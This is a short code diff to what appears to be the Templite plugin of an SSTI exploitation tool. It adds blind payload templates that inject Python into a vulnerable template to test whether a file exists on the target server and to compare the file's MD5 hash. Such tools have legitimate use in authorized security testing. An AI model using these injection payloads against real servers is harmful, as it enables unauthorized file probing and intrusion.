@@ -78,6 +78,11 @@ class Templite(python.Python):
                 'call': 'inject',
                 'md5': """${emit(__import__("hashlib").md5(open("SSTIMAP:path;", 'rb').read()).hexdigest())}$"""
             },
+            'md5_blind': {
+                'call': 'evaluate_blind',
+                'md5_blind': '''__import__("hashlib").md5(open("SSTIMAP:path;", 'rb').read()).hexdigest()=="SSTIMAP:md5;"''',
+                'exists_blind': '''__import__("os").path.isfile("SSTIMAP:path;")'''
+            },
         })
 
         self.set_contexts([
